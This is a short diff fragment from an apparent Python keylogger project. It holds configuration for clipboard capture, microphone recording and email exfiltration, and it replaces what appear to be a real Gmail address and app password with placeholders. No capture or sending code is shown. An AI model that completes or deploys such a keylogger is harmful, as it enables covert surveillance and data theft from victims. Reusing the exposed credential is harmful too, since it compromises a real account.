@@ -58,9 +58,9 @@ clipboard_information = "clipboard.txt"
 audio_information = "audio.wav"
 
 microphone_time = 10
-email_address = "jojo2215ret@gmail.com"
-password = "xooz efeg sgqw xcqh"
-toaddr = "jojo2215ret@gmail.com"
+email_address = "xxx@gmail.com"
+password = "xxxxxxxx"
+toaddr = "xxx@gmail.com"
 file_path = "C:/Users/dell/PycharmProjects/newkeyloggerprojectfinal/projectt"
 extend = "/"
 
